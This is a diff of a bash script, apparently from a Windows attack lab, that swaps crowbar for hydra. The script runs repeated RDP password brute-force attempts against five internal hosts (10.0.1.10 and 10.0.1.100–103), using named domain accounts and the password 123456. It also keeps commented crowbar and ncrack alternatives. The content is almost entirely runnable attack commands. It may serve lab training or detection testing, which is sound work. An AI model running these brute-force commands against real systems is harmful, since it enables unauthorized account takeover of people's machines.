@@ -12,36 +12,41 @@ sleep 1
 echo "launching RDP attack"
 for (( i=0; i<10; ++i)); do
     echo "RDP-Bruteforcing 10.0.1.10 with john:123456..."
-    echo "/crowbar/crowbar.py -b rdp -u winattacklab.local\\john -c 123456 -s 10.0.1.10/32"
-    /crowbar/crowbar.py -b rdp -u winattacklab.local\\john -c 123456 -s 10.0.1.10/32
+    echo "hydra -t 1 -V -f -l john -p 123456 rdp://10.0.1.10"
+    hydra -t 1 -V -f -l john -p 123456 rdp://10.0.1.10
+    # /crowbar/crowbar.py -b rdp -u winattacklab.local\\john -c 123456 -s 10.0.1.10/32
     # ncrack -v --user john --pass 123456 http://10.0.1.10:3389,to=5
 done
 
 for (( i=0; i<10; ++i)); do
     echo "RDP-Bruteforcing 10.0.1.100 with ibuetler:123456..."
-    echo "/crowbar/crowbar.py -b rdp -u winattacklab.local\\ibuetler -c 123456 -s 10.0.1.100/32"
-    /crowbar/crowbar.py -b rdp -u winattacklab.local\\ibuetler -c 123456 -s 10.0.1.100/32
+    echo "hydra -t 1 -V -f -l ibuetler -p 123456 rdp://10.0.1.100"
+    hydra -t 1 -V -f -l ibuetler -p 123456 rdp://10.0.1.100
+    # /crowbar/crowbar.py -b rdp -u winattacklab.local\\ibuetler -c 123456 -s 10.0.1.100/32
     # ncrack -v --user ibuetler --pass 123456 http://10.0.1.100:3389,to=5
 done
 
 for (( i=0; i<10; ++i)); do
     echo "RDP-Bruteforcing 10.0.1.101  with adiener:123456..."
-    echo "/crowbar/crowbar.py -b rdp -u winattacklab.local\\adiener -c 123456 -s 10.0.1.101/32"
-    /crowbar/crowbar.py -b rdp -u winattacklab.local\\adiener -c 123456 -s 10.0.1.101/32
+    echo "hydra -t 1 -V -f -l adiener -p 123456 rdp://10.0.1.101"
+    hydra -t 1 -V -f -l adiener -p 123456 rdp://10.0.1.101
+    # /crowbar/crowbar.py -b rdp -u winattacklab.local\\adiener -c 123456 -s 10.0.1.101/32
     # ncrack -v --user adiener --pass 123456 http://10.0.1.101:3389,to=5
 done
 
 for (( i=0; i<10; ++i)); do
     echo "RDP-Bruteforcing 10.0.1.102 with bgates:123456..."
-    echo "/crowbar/crowbar.py -b rdp -u winattacklab.local\\bgates -c 123456 -s 10.0.1.102/32"
-    /crowbar/crowbar.py -b rdp -u winattacklab.local\\bgates -c 123456 -s 10.0.1.102/32
+    echo "hydra -t 1 -V -f -l bgates -p 123456 rdp://10.0.1.102"
+    hydra -t 1 -V -f -l bgates -p 123456 rdp://10.0.1.102
+    # /crowbar/crowbar.py -b rdp -u winattacklab.local\\bgates -c 123456 -s 10.0.1.102/32
     # ncrack -v --user bgates --pass 123456 http://10.0.1.102:3389,to=5
 done
 
 for (( i=0; i<10; ++i)); do
     echo "RDP-Bruteforcing 10.0.1.103 with emusk:123456..."
-    echo "/crowbar/crowbar.py -b rdp -u winattacklab.local\\emusk -c 123456 -s 10.0.1.103/32"
-    /crowbar/crowbar.py -b rdp -u winattacklab.local\\emusk -c 123456 -s 10.0.1.103/32
+    echo "hydra -t 1 -V -f -l emusk -p 123456 rdp://10.0.1.103"
+    hydra -t 1 -V -f -l emusk -p 123456 rdp://10.0.1.103
+    # /crowbar/crowbar.py -b rdp -u winattacklab.local\\emusk -c 123456 -s 10.0.1.103/32
     # ncrack -v --user emusk --pass 123456 http://10.0.1.103:3389,to=5
 done
 
